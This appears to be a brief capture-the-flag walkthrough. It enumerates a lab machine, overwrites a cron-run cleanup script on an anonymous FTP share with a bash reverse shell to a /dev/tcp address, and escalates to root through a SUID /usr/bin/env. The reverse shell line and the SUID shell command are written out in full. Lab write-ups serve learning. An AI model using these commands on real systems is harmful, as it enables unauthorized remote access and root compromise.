* nmap

   ![image](https://user-images.githubusercontent.com/92675550/174432657-730e26af-6177-4cfe-906e-28842a7b9c24.png)

* smb

    ![image](https://user-images.githubusercontent.com/92675550/174432672-b33a0321-26f5-417e-8bf7-04e3c87e6ce4.png)
    
    its contents(no use)
      ![image](https://user-images.githubusercontent.com/92675550/174432739-2223ef13-020e-4e6b-b5ae-22158cc7fb88.png)


* ftp
* 
   ![image](https://user-images.githubusercontent.com/92675550/174432784-41681aaa-be31-4fda-a085-d3c65aef501b.png)
   
   ->contents of clean.sh 
   `#!/bin/bash
    tmp_files=0
    echo $tmp_files
    if [ $tmp_files=0 ]
    then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
    else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
    fi`
    
    contents of removed_files.log
         Running cleanup script:  nothing to delete
                 (repeated many times: hinds that clean.sh is run in regular interval)
   
   -aim for getting shell then
      `#!/bin/bash
       sh -i >& /dev/tcp/10.17.52.250/5050 0>&1`
       
   -then put clean.sh back into ftp(edited one)..and keep listening on ur computer using nc.
   
   -after 1 min we get the shell.
   
   -then searched for SUID binaries ! got /usr/bin/env.
   
   -referred gftobin `/usr/bin/env /bin/sh -p`
   
   -cat /root/root.txt
